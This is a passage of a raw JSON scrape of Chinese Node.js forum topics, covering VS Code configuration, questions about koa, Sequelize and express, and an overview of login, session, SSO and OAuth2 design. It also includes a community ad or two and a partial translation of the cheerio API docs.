Mono&#x27;, &#x27;iA Writer Duospace&#x27;, &#x27;Source Code Pro&#x27;, Menlo, Monaco, monospace&quot;,\n&quot;editor.fontLigatures&quot;: true\n</code></pre><p>关于缩进，我是这样配置的：</p>\n<pre class=\"prettyprint language-json\"><code> &quot;editor.detectIndentation&quot;: true,\n &quot;editor.renderIndentGuides&quot;: false,\n</code></pre><p>import路径移动或者重命名时，自动更新:</p>\n<pre class=\"prettyprint language-json\"><code>&quot;javascript.updateImportsOnFileMove.enabled&quot;: &quot;always&quot;,\n</code></pre><h3>user-settings.json</h3>\n<p>下面是我的VS Code的配置文件<strong>user-settings.json</strong>：</p>\n<pre class=\"prettyprint language-json\"><code>{\n    &quot;workbench.colorCustomizations&quot;: {\n        &quot;activityBar.background&quot;: &quot;#111111&quot;,\n        &quot;activityBarBadge.background&quot;: &quot;#FFA000&quot;,\n        &quot;list.activeSelectionForeground&quot;: &quot;#FFA000&quot;,\n        &quot;list.inactiveSelectionForeground&quot;: &quot;#FFA000&quot;,\n        &quot;list.highlightForeground&quot;: &quot;#FFA000&quot;,\n        &quot;scrollbarSlider.activeBackground&quot;: &quot;#FFA00050&quot;,\n        &quot;editorSuggestWidget.highlightForeground&quot;: &quot;#FFA000&quot;,\n        &quot;textLink.foreground&quot;: &quot;#FFA000&quot;,\n        &quot;progressBar.background&quot;: &quot;#FFA000&quot;,\n        &quot;pickerGroup.foreground&quot;: &quot;#FFA000&quot;,\n        &quot;tab.activeBorder&quot;: &quot;#FFA000&quot;,\n        &quot;notificationLink.foreground&quot;: &quot;#FFA000&quot;,\n        &quot;editorWidget.resizeBorder&quot;: &quot;#FFA000&quot;,\n        &quot;editorWidget.border&quot;: &quot;#FFA000&quot;,\n        &quot;settings.modifiedItemIndicator&quot;: &quot;#FFA000&quot;,\n        &quot;settings.headerForeground&quot;: &quot;#FFA000&quot;,\n        &quot;panelTitle.activeBorder&quot;: &quot;#FFA000&quot;,\n        &quot;breadcrumb.activeSelectionForeground&quot;: &quot;#FFA000&quot;,\n        &quot;menu.selectionForeground&quot;: &quot;#FFA000&quot;,\n        &quot;menubar.selectionForeground&quot;: &quot;#FFA000&quot;\n    },\n    &quot;editor.fontSize&quot;: 14,\n    &quot;editor.lineHeight&quot;: 24,\n    &#x2F;&#x2F; These are for subliminal, check them out.\n    &quot;editor.hideCursorInOverviewRuler&quot;: true,\n    &quot;editor.lineNumbers&quot;: &quot;on&quot;,\n    &quot;editor.overviewRulerBorder&quot;: false,\n    &quot;editor.renderIndentGuides&quot;: false,\n    &quot;editor.renderLineHighlight&quot;: &quot;none&quot;,\n    &quot;editor.quickSuggestions&quot;: true,\n    &#x2F;&#x2F; end subliminal changes\n    &quot;editor.fontFamily&quot;: &quot;&#x27;Fira Code&#x27;, &#x27;Operator Mono&#x27;, &#x27;iA Writer Duospace&#x27;, &#x27;Source Code Pro&#x27;, Menlo, Monaco, monospace&quot;,\n    &quot;vsicons.projectDetection.autoReload&quot;: true,\n    &quot;editor.formatOnPaste&quot;: false,\n    &quot;editor.formatOnSave&quot;: true,\n    &quot;editor.fontLigatures&quot;: true,\n    &quot;prettier.tabWidth&quot;: 4,\n    &quot;editor.wordWrap&quot;: &quot;on&quot;,\n    &quot;editor.detectIndentation&quot;: true,\n    &quot;workbench.iconTheme&quot;: &quot;eq-material-theme-icons-palenight&quot;,\n    &quot;editor.minimap.enabled&quot;: false,\n    &quot;editor.minimap.renderCharacters&quot;: false,\n    &quot;prettier.parser&quot;: &quot;flow&quot;,\n    &quot;workbench.editor.enablePreview&quot;: false,\n    &quot;emmet.includeLanguages&quot;: {\n        &quot;javascript&quot;: &quot;javascriptreact&quot;,\n        &quot;jsx-sublime-babel-tags&quot;: &quot;javascriptreact&quot;\n    },\n    &quot;emmet.triggerExpansionOnTab&quot;: true,\n    &quot;emmet.showExpandedAbbreviation&quot;: &quot;never&quot;,\n    &quot;workbench.statusBar.visible&quot;: true,\n    &quot;workbench.activityBar.visible&quot;: true,\n    &quot;workbench.editor.showIcons&quot;: false,\n    &quot;editor.multiCursorModifier&quot;: &quot;ctrlCmd&quot;,\n    &quot;explorer.confirmDelete&quot;: false,\n    &quot;window.zoomLevel&quot;: 0,\n    &quot;javascript.updateImportsOnFileMove.enabled&quot;: &quot;always&quot;,\n    &quot;materialTheme.accent&quot;: &quot;Yellow&quot;,\n    &quot;editor.cursorBlinking&quot;: &quot;smooth&quot;,\n    &quot;editor.fontWeight&quot;: &quot;500&quot;\n}\n</code></pre><p>如果你想知道更多的VS Code使用技巧，可以查看<a href=\"http://vscodecandothat.com/\">VSCode Can Do That</a>。</p>\n<h3>推荐阅读</h3>\n<ul>\n<li><a href=\"https://blog.fundebug.com/2018/07/24/vs-extensions/\">30个极大提高开发效率的VS Code插件</a></li>\n<li><a href=\"https://blog.fundebug.com/2017/10/23/format-code-use-Prettier/\">我为什么推荐Prettier来统一代码风格</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了6亿+错误事件，得到了Google、360、金山软件等众多知名用户的认可。欢迎免费试用！</p>\n</div>","title":"高效开发者是如何个性化VS Code插件与配置的？","last_reply_at":"2019-02-25T03:20:08.293Z","good":false,"top":false,"reply_count":0,"visit_count":866,"create_at":"2019-02-25T03:20:08.293Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c70ea11e1a81129a7ad9de8","author_id":"5a729a709d371d4a059ef083","tab":"ask","content":"<div class=\"markdown-text\"><p>今天在给koa项目引入<a href=\"/user/types\">@types</a>/koa的时候发现，它在ctx上没有标注body…但既有项目上有大量通过ctx.body取请求体里值的代码\n修改<a href=\"/user/types\">@types</a>/koa 的index.d.ts是很容易，问题是重新安装依赖的时候并不会是修改后的版本，而直接保存依赖包又比较不合理\n所以想在 nodemodules 外新建一个typing来保存koa的类型声明…\n然后，我发现，单纯的把类型依赖移进去，并通过指定\n（路径被转义了…凑合看…）</p>\n<pre class=\"prettyprint language- js\"><code>{\n    &quot;compilerOptions&quot;: {\n        &quot;typeRoots&quot; : [\n            &quot;.&#x2F;typings&#x2F;[@types](&#x2F;user&#x2F;types)&#x2F;&quot;,\n            &quot;.&#x2F;node_modules&#x2F;[@types](&#x2F;user&#x2F;types)&#x2F;&quot;\n        ]\n    },\n}\n\n</code></pre><p>是读不出来的，貌似是koa的包里有指明存在声明文件的话会在哪？或者是默认规则？\n有办法，在nodemodules外单独维护第三方依赖包的类型声明文件么？</p>\n</div>","title":"有办法在node_modules 外保存依赖包的@types文件的同时保证解析器能读到这个类型说明吗？","last_reply_at":"2019-02-23T17:02:38.095Z","good":false,"top":false,"reply_count":2,"visit_count":527,"create_at":"2019-02-23T06:37:05.970Z","author":{"loginname":"w46245","avatar_url":"https://avatars1.githubusercontent.com/u/13960592?v=4&s=120"}},{"id":"5c6cef4de1a81129a7ad8a96","author_id":"5a729a709d371d4a059ef083","tab":"ask","content":"<div class=\"markdown-text\"><p>比如一个请求还没结束的时候进来了第二个请求，这个时候日志就会重叠…\n我能想到的，比如，请求进入的时候运行日志记录开始，后续的日志记录到一个数组里，结束的时候一次性写到文件里去，保证一块一块的…\n想知道有没有别的办法</p>\n</div>","title":"起http服务比如koa时有并发导致日志的顺序很乱有什么解决方案么？","last_reply_at":"2019-02-23T06:29:39.158Z","good":false,"top":false,"reply_count":7,"visit_count":760,"create_at":"2019-02-20T06:10:21.628Z","author":{"loginname":"w46245","avatar_url":"https://avatars1.githubusercontent.com/u/13960592?v=4&s=120"}},{"id":"5c203e7776c4964062a1ce04","author_id":"5129b03cdf9e9fcc58f3673c","tab":"share","content":"<div class=\"markdown-text\"><p>各位小哥哥小姐姐，分享个圣诞桌面祝大家圣诞快乐\n<a href=\"http://desktop.bittyos.com/?share=46fada80-f9fc-11e8-a653-373a5689e1b3\">http://desktop.bittyos.com/?share=46fada80-f9fc-11e8-a653-373a5689e1b3</a>\n<img src=\"//static.cnodejs.org/FrFmzitH9OluHpCz3xAZlMPwHjww\" alt=\"QQ截图20181224103521.jpg\"></p>\n<p>唯美三生三世主题的桌面\n<a href=\"http://desktop.bittyos.com/?share=6d4ff590-33fd-11e9-a653-373a5689e1b3\">http://desktop.bittyos.com/?share=6d4ff590-33fd-11e9-a653-373a5689e1b3</a>\n<img src=\"//static.cnodejs.org/FvaDCaeEjCoFOpEF0vQtem7LAfKr\" alt=\"QQ截图20190218140012.png\"></p>\n</div>","title":"圣诞桌面 Merry Christmas & 唯美三生三世桌面","last_reply_at":"2019-02-23T05:18:26.595Z","good":false,"top":false,"reply_count":12,"visit_count":1766,"create_at":"2018-12-24T02:03:35.105Z","author":{"loginname":"yunfei","avatar_url":"https://avatars1.githubusercontent.com/u/6891001?v=4&s=120"}},{"id":"5c6fc2d133b0b629ac84454f","author_id":"5ab1e8e8e7b166bb7b9ecca9","tab":"ask","content":"<div class=\"markdown-text\"><h2>问题</h2>\n<p>2个表相关联，一定要在2个表中的定义associate吗，\n如下user表，post表，\n一个用户可以有多篇文章，一篇文章只能属于一个用户</p>\n<pre class=\"prettyprint\"><code>app.model.User.hasMany(app.model.Post, { as: &#x27;posts&#x27; });\n</code></pre><pre class=\"prettyprint\"><code>app.model.Post.belongsTo(app.model.User, { as: &#x27;user&#x27;, foreignKey: &#x27;user_id&#x27; });\n</code></pre><h2>user表</h2>\n<pre class=\"prettyprint\"><code>  const User = app.model.define(&#x27;user&#x27;, {\n    id: {\n      type: INTEGER,\n      primaryKey: true,\n      autoIncrement: true,\n    },\n    name: STRING(30),\n    age: INTEGER,\n    created_at: DATE,\n    updated_at: DATE,\n  });\n\n  User.prototype.associate = function() {\n    app.model.User.hasMany(app.model.Post, { as: &#x27;posts&#x27; });\n  };\n</code></pre><h2>post</h2>\n<pre class=\"prettyprint\"><code>  const Post = app.model.define(&#x27;post&#x27;, {\n    id: {\n      type: INTEGER,\n      primaryKey: true,\n      autoIncrement: true,\n    },\n    title: STRING(30),\n    content: STRING(255),\n    user_id: INTEGER,\n    created_at: DATE,\n    updated_at: DATE,\n  });\n\n  Post.associate = function() {\n    app.model.Post.belongsTo(app.model.User, { as: &#x27;user&#x27;, foreignKey: &#x27;user_id&#x27; });\n  };\n</code></pre></div>","title":"Sequelize联表查询的问题","last_reply_at":"2019-02-23T02:37:43.045Z","good":false,"top":false,"reply_count":2,"visit_count":574,"create_at":"2019-02-22T09:37:21.267Z","author":{"loginname":"1134506391","avatar_url":"https://avatars2.githubusercontent.com/u/30287598?v=4&s=120"}},{"id":"5c64daa8f53f161dbaeb3826","author_id":"599e2723ebaa046923a826f0","tab":"ask","content":"<div class=\"markdown-text\"><p>以前在vscode上写的项目是可以的，像这样：\n<img src=\"//static.cnodejs.org/FjypwT71XPgj6k0y516EAp57Sa0W\" alt=\"image.png\">\n然后用起来：\n<img src=\"//static.cnodejs.org/FtePjhuATXOaQ243bqug1EvBpTEm\" alt=\"image.png\">\n有提示，然后可以根据提示去写代码，但是后来写了另外的项目，基本这个部分是抄袭的，然而竟然检测不出，导致：\n<img src=\"//static.cnodejs.org/FlZclcLrjJN2aIhsynebDNSIH3ev\" alt=\"image.png\">\n这样，虽然可以用，但是好不爽啊，在ws上是没问题的。\n我花了时间对比了两个项目的各种设置和vscode的设置，没找出问题。\n各位可有类似经验？可否拯救一下小弟。</p>\n</div>","title":"求助：关于在vscode上，不能提示vue中import js文件的问题","last_reply_at":"2019-02-22T16:26:11.501Z","good":false,"top":false,"reply_count":3,"visit_count":1035,"create_at":"2019-02-14T03:04:08.831Z","author":{"loginname":"HobaiRiku","avatar_url":"https://avatars2.githubusercontent.com/u/26238803?v=4&s=120"}},{"id":"5c6e12e9e1a81129a7ad910c","author_id":"5c529dd5e6aaad2ea76de3a2","tab":"ask","content":"<div class=\"markdown-text\"><p>我将favicon.ico放在了public目录中，然后直接使用<code>js\\n &lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt; \\n</code>，用浏览器右键open in new tab能打开，但是图标并不显示，在network里也没看到关于favicon.ico的请求。然后我下载了serve-favicon，<code>js\\n var favicon = require('serve-favicon'); app.use(favicon(__dirname + '/public/favicon.ico'));\\n</code>并不生效，请大佬帮忙看一下，非常感谢</p>\n</div>","title":"请问express4中favicon设置为什么没生效？","last_reply_at":"2019-02-22T15:41:45.913Z","good":false,"top":false,"reply_count":3,"visit_count":536,"create_at":"2019-02-21T02:54:33.677Z","author":{"loginname":"pc937466839","avatar_url":"https://avatars2.githubusercontent.com/u/26129458?v=4&s=120"}},{"id":"5c6e814f33b0b629ac843e87","author_id":"564582ec5e7412b625b8bf16","tab":"ask","content":"<div class=\"markdown-text\"><p>在express框架下，结合七牛云，实现ueditor编辑器的中的所有文件上传到七牛空间中，能开发的小伙伴私信，任务截止时间：明天（22号）早上9点前交付。能完成的小伙伴私信，带上你的报价。\n长期任务兼职，微信 c35353。加我请备注 cnode</p>\n</div>","title":"【兼职任务】 express + ueditor + 七牛云","last_reply_at":"2019-02-22T08:17:39.483Z","good":false,"top":false,"reply_count":1,"visit_count":859,"create_at":"2019-02-21T10:45:35.933Z","author":{"loginname":"RajanZhan","avatar_url":"https://avatars1.githubusercontent.com/u/15818327?v=4&s=120"}},{"id":"5c6f5cab33b0b629ac844170","author_id":"5c6f5c42e1a81129a7ad9809","tab":"share","content":"<div class=\"markdown-text\"><p>NEO DAPP全球区块链应用开发挑战赛于北京时间2018年12月21日正式拉开序幕，此次大赛旨在发掘与聚集更多区块链开发者，探索各行各业与区块链的结合方式，促进区块链应用领域的继续创新，从而催生出更多优秀的区块链应用，形成一个强大的区块链应用开发者生态。</p>\n<p>为更好地激励技术开发者加入这场技术挑战赛，我们将在全球范围内拿出30万奖金，共设16个奖项以此激励在大赛中脱颖而出的优秀技术团队们。\n<img src=\"//static.cnodejs.org/FkI6EFfMPP6kOh6JUIZLUPIP8fUr\" alt=\"image.png\">\n时间截止至3.31日\n评选标准\n● 产品逻辑：整个产品设计的运行逻辑 （15%）</p>\n<p>● 区块链应用点：与区块链结合的匹配度和上链逻辑（15%）</p>\n<p>● 技术开发：技术实现的性能和效果（20%）</p>\n<p>● 产品视觉：视觉设计以及呈现的效果（10%）</p>\n<p>● 商业模式：是否具备市场应用价值和可行的商业模式（10%）</p>\n<p>● 人气值：采用用户投票方式收集人气，得票即为人气值（10%）</p>\n<p>● 开发进度：对应时间节点的开发进度和作品完整程度（20%）\n报名方式\n扫描二维码\n<img src=\"//static.cnodejs.org/FkZS9Bnmz0ZqDM884ESYRj-TADVG\" alt=\"image.png\">\n或者联系微信：f18268579344和公众号NEONEXT\n添加微信时，记得备注next哦！</p>\n</div>","title":"“NEO DAPP全球区块链应用开发挑战赛”报名进行中","last_reply_at":"2019-02-22T08:15:09.426Z","good":false,"top":false,"reply_count":1,"visit_count":684,"create_at":"2019-02-22T02:21:31.002Z","author":{"loginname":"HVOD","avatar_url":"https://avatars2.githubusercontent.com/u/47730911?v=4&s=120"}},{"id":"5c458c396955112b99437594","author_id":"54edd6faf08635a279d18cff","tab":"ask","content":"<div class=\"markdown-text\"><p>谁有收藏2019前端技能树这样子的图，能否发我一下，多谢-V-</p>\n</div>","title":"谁有收藏2019前端技能树这样子的图，能否发一下","last_reply_at":"2019-02-22T07:54:08.444Z","good":false,"top":false,"reply_count":9,"visit_count":2249,"create_at":"2019-01-21T09:09:13.218Z","author":{"loginname":"nqdy666","avatar_url":"https://avatars2.githubusercontent.com/u/5211893?v=4&s=120"}},{"id":"5c6fa32133b0b629ac8443d6","author_id":"573212537abbbd520cb244b3","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"https://jsbin.com/pihujok/edit?html,css,output\">https://jsbin.com/pihujok/edit?html,css,output</a></p>\n<p>我现在用的是 css3 循环动画,  然后每次更新最后一条数据.\n效果不太理想, 有更好的办法么?</p>\n</div>","title":"这种弹幕数据如何渲染?","last_reply_at":"2019-02-22T07:22:09.319Z","good":false,"top":false,"reply_count":0,"visit_count":787,"create_at":"2019-02-22T07:22:09.319Z","author":{"loginname":"dlyt","avatar_url":"https://avatars0.githubusercontent.com/u/18431616?v=4&s=120"}},{"id":"5671441a1d2912ce2a35aaa1","author_id":"530ed7b25adfcd9c0f0713b6","tab":"share","content":"<div class=\"markdown-text\"><p>也不知道是什么原因，刚开始不久的职业生涯，在技术这条路走着走着，和「登录」总是有着一个不解之缘。还记得当初学习Web编程的时候么？不管是Java、.Net、PHP，继经典「Hello World」之后，要写的很有可能就是「登录」功能。至今「登录」的问题还是让我心中一万只草泥马奔过。\n下面，给分享一下各种「登录」相关的需求</p>\n<h2>普通的登录</h2>\n<p>这个是极其普通的登录需求，要的就是一个登录页面，输入账号密码，提交Form表单，后端查询数据库对应用户名的密码，匹配正确则把用户记录到Session，不正确则返回错误。\n这种登录，在上学的时候，也许敬爱的老师就已经教过你了。\n但可能他没有教你的是，密码需要hash加密，session为什么可以记录登录用户的原理。</p>\n<p><strong>密码Hash</strong>\n密码hash，就是存进数据库的密码是一串密文，密文是明文密码通过不可逆算法得出的。在Nodejs中，你可以使用<a href=\"https://www.npmjs.com/package/bcryptjs\">bcryptjs</a>，它提供了<code>hash</code>以及对应的<code>compare</code>方法，非常适合用于密码的加密和对比。</p>\n<p><strong>Session原理</strong>\nSession的原理其实还是依赖了Cookie，所以Cookie才是记录用户凭证的真理。它的原理大概是酱紫的：服务器端维护一个session的表，这个表的每一条记录存的就是与某一个客户端的会话，会话会有过期时间，过期的会话会被清理。然后这个会话，会有一个对应的id，一般是一串长长的看不懂的字符串，然后这个字符串会被存储在客户端的cookie中，每一次请求服务器端都会带上这个cookie，服务器端就知道访问的就是哪个客户端了。\n欲知更多有关「Session原理」请点击传送门：<a href=\"http://www.jianshu.com/p/2b7c10291aad\">Session原理</a></p>\n<h2>使用独立登录系统</h2>\n<p>应项目需要，登录逻辑需要独立出来做成一个系统，就是另外一个项目。与原来的主站不是在同一个项目中了。一个域名是 <code>www.site.com</code>，一个则是<code>passport.site.com</code>了。要在不同的域名下进行登录，一般的方法是<code>www.site.com/login</code> 跳转到 <code>passport.site.com/login</code>，passport这边是一个登录页面，用户输入账号密码登录成功之后，passport会通过带着一个可逆加密的包含用户信息的token，重定向到<code>www.site.com</code>提供的回调处理地址，然后进行解密，匹配正确，则登录用户。\n要注意的是，这里的加密的信息需要包含一个时间戳，接收方需要认证这个时间戳，过期登录失败。避免token被窃取，被无限登录site系统。</p>\n<h2>单点登录</h2>\n<p>单点登录需要实现的需求，说白了就是在站点A的登录了，那么用户就自动在站点B、站点C、站点E、F、G登录。\n这又分两种情况，A站点和B站点是否在同一个二级域名下。\n假如是在同一个域名下，例如<code>siteA.site.com</code>与<code>siteB.site.com</code>，因为cookie允许设置到二级域名下<code>.site.com</code>，所以siteA和siteB是可以共享cookie的，用户的信息可以通过可逆加密放在二级域名下的cookie，并且设置<code>http only</code>，就可以一站登录，站站登录。\n而如果A站点和B站点不在同一二级域名下，例如<code>www.siteA.com</code>与<code>www.siteB.com</code>，他们就无法通过共享cookie的方式共享用户信息，所以需要用到jsonp的方式，用户在siteA登录之后，提供一个jsonp接口获取加密的用户信息，siteB访问这个jsonp获取加密信息。达到共享用户状态的效果。\n欲知更多有关「单点登录」请点击传送门：<a href=\"http://www.jianshu.com/p/613e44d4a464\">单点登录的三种实现方式</a></p>\n<h2>OAuth2.0登录</h2>\n<p>这就比较普遍了，现在随随便便做个网站，都接入「微信登录」、「微博登录」、「豆瓣登录」、「QQ登录」、「Github登录」、<em>@^</em>&amp;@%#^%^@%&amp;%@&amp;#…\n这些统一叫做：「第三方登录」。\n第三方登录都是实现了OAuth2.0协议的，流程大概是酱紫的：\n第三方提供一个登录入口，也就是第三方域名下的登录页面。主站需要登录的时候，引导用户重定向到第三方的登录页面，用户输入账号密码之后，登录第三方系统，第三方系统匹配帐号成功之后，带上一个code到主站的回调地址，主站接收到code，短时间内拿着code请求第三方提供获取长期凭证的接口(因为code有一个比较短的过期时间)，这个长期凭证叫<code>access_token</code>，获取之后就把这个<code>access_token</code>存到数据库中，请求一些第三方提供的API，需要用到这个<code>access_token</code>，因为这个token就是记录用户在第三方系统的一个身份凭证。\n一些系统，在获取<code>access_token</code>的时候，还会返回一个副参数<code>refresh_token</code>，因为<code>access_token</code>是有过期时间的，一旦过期了，主站可以使用<code>refresh_token</code>请求第三方提供的接口获取新的<code>access_token</code>以及新的<code>refresh_token</code>。\n在Nodejs中，你可以使用<code>passport</code>来给第三方登录提供一个统一解决方案，而如果你是开发「微信公众号」授权，除了<a href=\"https://www.npmjs.com/package/passport\">passport</a>，也可以使用<a href=\"https://www.npmjs.com/package/wechat-oauth\">wechat-oauth</a></p>\n<h2>在最后</h2>\n<p>其实登录问题，理解了Session原理是很重要的，这个也不难理解。然后站点之间的用户信息交流，就是通过各种跨域限制，各种加密解密而已。在做这个的时候，需要充分考虑到加密的token是否会被窃取的可能性，还要考虑让这个token加上时间的验证，在一些可能会被窃取，安全需求比较高的情况，就需要把token的时间设置的更短。还有就是加密的方式需要依照需求不同而选择可逆或者不可逆，hash sha1还是JWT(Json Web Token)。\nsha1加密，可以使用Nodejs自带的<code>crypto</code>，JWT可以使用<a href>jsonwebtoken</a></p>\n<hr>\n<p>如果本文对您有用\n请不要吝啬你们的Follow与Start\n这会大大支持我们继续创作</p>\n<p><strong>「Github」</strong>\nMZMonster ：<a href=\"https://github.com/MZMonster/\">@MZMonster</a>\nJC_Huang ：<a href=\"https://github.com/JerryC8080\">@JerryC8080</a></p>\n<p><strong>「简书」</strong>\nMZMonster：<a href=\"http://www.jianshu.com/collection/2a4335808d4c\">@MZMonster</a>\nJC_Huang：<a href=\"http://www.jianshu.com/users/843d2366f95b/latest_articles\">@JC_Huang</a></p>\n</div>","title":"登录那些事儿","last_reply_at":"2019-02-22T03:48:45.670Z","good":true,"top":false,"reply_count":42,"visit_count":30034,"create_at":"2015-12-16T10:59:38.333Z","author":{"loginname":"JerryC8080","avatar_url":"https://avatars0.githubusercontent.com/u/6801672?v=4&s=120"}},{"id":"5203a71844e76d216a727d2e","author_id":"5167d7b96d38277306098b54","tab":"share","content":"<div class=\"markdown-text\"><p>所谓工欲善其事，必先利其器，所以通读了<a href=\"https://npmjs.org/package/cheerio\">cheerio</a>的API，顺便翻译了一遍，有些地方因为知道的比较少，不知道什么意思，保留了英文，希望各位不吝告诉我，然后一起把这个翻译完成。</p>\n<p>###cheerio\n为服务器特别定制的，快速、灵活、实施的jQuery核心实现.\n###Introduction\n将HTML告诉你的服务器</p>\n<pre class=\"prettyprint\"><code>var cheerio = require(&#x27;cheerio&#x27;),\n    $ = cheerio.load(&#x27;&lt;h2 class=&quot;title&quot;&gt;Hello world&lt;&#x2F;h2&gt;&#x27;);\n\n$(&#x27;h2.title&#x27;).text(&#x27;Hello there!&#x27;);\n$(&#x27;h2&#x27;).addClass(&#x27;welcome&#x27;);\n\n$.html();\n&#x2F;&#x2F;=&gt; &lt;h2 class=&quot;title welcome&quot;&gt;Hello there!&lt;&#x2F;h2&gt;\n</code></pre><p>###Installation\nnpm install cheerio</p>\n<p>###Features\n**❤ 相似的语法:**Cheerio 包括了 jQuery 核心的子集。Cheerio  从jQuery库中去除了所有 DOM不一致性和浏览器尴尬的部分，揭示了它真正优雅的API。</p>\n<p>**ϟ 闪电般的块:**Cheerio 工作在一个非常简单，一致的DOM模型之上。解析，操作，呈送都变得难以置信的高效。基础的端到端的基准测试显示Cheerio 大约比JSDOM快八倍(8x)。</p>\n<p><strong>❁ 巨灵活:</strong> Cheerio 封装了兼容的htmlparser。Cheerio 几乎能够解析任何的 HTML 和 XML document。</p>\n<p>###What about JSDOM\n我写cheerio 是因为我发现我自己对JSDOM越来越沮丧。对于我来说，总是会一次又一次的碰上几个难点。</p>\n<ul>\n<li>\n<p><strong>JSDOM内建的解析太过于严格</strong>: JSDOM附带的HTML解析不能处理很多当下的大众的网站。</p>\n</li>\n<li>\n<p><strong>JSDOM太慢</strong>:用JSDOM解析大型网站存在可见的延迟。</p>\n</li>\n<li>\n<p><strong>JSDOM太累赘</strong>:JSDOM的目标是提供一个我们在浏览器里面看到的相同的 DOM 环境。我从没有真的需要所有这些东西，我只是想要一个简单的，相似的方法去处理HTML。</p>\n</li>\n</ul>\n<p>###When I would use JSDOM\nCheerio 不会解决你的所有问题。我人会使用JSDOM如果我需要用一个在服务器上的浏览器环境，特别是如果我想要自动化一些功能测试。\n###API\n####我们将用到的标记示例\n&lt;ul id=“fruits”&gt;\n&lt;li class=“apple”&gt;Apple&lt;/li&gt;\n&lt;li class=“orange”&gt;Orange&lt;/li&gt;\n&lt;li class=“pear”&gt;Pear&lt;/li&gt;\n&lt;/ul&gt;</p>\n<p>这是我们将会在所有的API例子中用到的HTML标记</p>\n<p>####Loading\n首先你需要加载HTML。这一步对jQuery来说是必须的，since jQuery operates on the one, baked-in DOM。通过Cheerio,我们需要把HTML document 传进去。</p>\n<p>这是<strong>首选</strong>:</p>\n<pre class=\"prettyprint\"><code>var cheerio = require(&#x27;cheerio&#x27;),\n    $ = cheerio.load(&#x27;&lt;ul id=&quot;fruits&quot;&gt;...&lt;&#x2F;ul&gt;&#x27;);\n</code></pre><p>或者通过传递字符串作为内容来加载HTML:</p>\n<pre class=\"prettyprint\"><code>$ = require(&#x27;cheerio&#x27;);\n$(&#x27;ul&#x27;, &#x27;&lt;ul id=&quot;fruits&quot;&gt;...&lt;&#x2F;ul&gt;&#x27;);\n</code></pre><p>Or as the root:</p>\n<pre class=\"prettyprint\"><code>$ = require(&#x27;cheerio&#x27;);\n$(&#x27;li&#x27;, &#x27;ul&#x27;, &#x27;&lt;ul id=&quot;fruits&quot;&gt;...&lt;&#x2F;ul&gt;&#x27;);\n</code></pre><p>你也可以传递一个额外的对象给.load()如果你需要更改任何的默认解析选项的话:</p>\n<pre class=\"prettyprint\"><code>$ = cheerio.load(&#x27;&lt;ul id=&quot;fruits&quot;&gt;...&lt;&#x2F;ul&gt;&#x27;, {\n    ignoreWhitespace: true,\n    xmlMode: true\n});\n</code></pre><p>这些解析选项都是直接来自htmlparser ，因此任何在htmlparser里有效的选项在Chreeio里也是行得通的。默认的选项如下:</p>\n<pre class=\"prettyprint\"><code>{\n    ignoreWhitespace: false,\n    xmlMode: false,\n    lowerCaseTags: false\n}\n</code></pre><p>想看选项清单和它们都效果，看\n<a href=\"https://github.com/fb55/DomHandler\">这个</a>和\n<a href=\"https://github.com/fb55/htmlparser2/wiki/Parser-options\">这个</a></p>\n<p>####Selectors</p>\n<p>Cheerio的选择器用起来几乎和jQuery一样，所以API也很相似。</p>\n<p><strong>$(selectior,[context],[root])</strong></p>\n<p>选择器在 Context 范围内搜索，Context又在Root范围内搜索。selector 和context可是是一个字符串表达式，DOM元素，和DOM元素的数组，或者chreeio对象。root 是通常是HTML 文档字符串。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.apple&#x27;, &#x27;#fruits&#x27;).text()\n&#x2F;&#x2F;=&gt; Apple\n\n$(&#x27;ul .pear&#x27;).attr(&#x27;class&#x27;)\n&#x2F;&#x2F;=&gt; pear\n\n$(&#x27;li[class=orange]&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;orange&quot;&gt;Orange&lt;&#x2F;li&gt;\n</code></pre><p>####Attributes\n获得和修改属性</p>\n<p><strong>.attr(name,value)</strong></p>\n<p>获得和修改属性。在匹配的元素中只能获得第一元素的属性。如果设置一个属性的值为null，则移除这个属性。你也可以传递一对键值，或者一个函数。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;ul&#x27;).attr(&#x27;id&#x27;)\n&#x2F;&#x2F;=&gt; fruits\n\n$(&#x27;.apple&#x27;).attr(&#x27;id&#x27;, &#x27;favorite&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;apple&quot; id=&quot;favorite&quot;&gt;Apple&lt;&#x2F;li&gt;\n</code></pre><p>更多信息请看<a href=\"http://api.jquery.com/attr/\">这里</a></p>\n<p><strong>value([value])</strong></p>\n<p>获得和修改input,select,textarea的value.注意: 对于传递键值和函数的支持还没有被加进去。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;input[type=&quot;text&quot;]&#x27;).val()\n=&gt; input_text\n\n$(&#x27;input[type=&quot;text&quot;]&#x27;).val(&#x27;test&#x27;).html()\n=&gt; &lt;input type=&quot;text&quot; value=&quot;test&quot;&#x2F;&gt;\n</code></pre><p><strong>.removeAttr(name)</strong></p>\n<p>通过name删除属性</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).removeAttr(&#x27;class&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li&gt;Pear&lt;&#x2F;li&gt;\n</code></pre><p><strong>.hasClass( className )</strong></p>\n<p>检查匹配的元素是否有给出的类名</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).hasClass(&#x27;pear&#x27;)\n&#x2F;&#x2F;=&gt; true\n\n$(&#x27;apple&#x27;).hasClass(&#x27;fruit&#x27;)\n&#x2F;&#x2F;=&gt; false\n\n$(&#x27;li&#x27;).hasClass(&#x27;pear&#x27;)\n&#x2F;&#x2F;=&gt; true\n</code></pre><p><strong>.addClass(className)</strong></p>\n<p>增加class(es)给所有匹配的elements.也可以传函数。</p>\n<pre class=\"prettyprint\"><code>$(&#x27;.pear&#x27;).addClass(&#x27;fruit&#x27;).html()\n&#x2F;&#x2F;=&gt; &lt;li class=&quot;pear 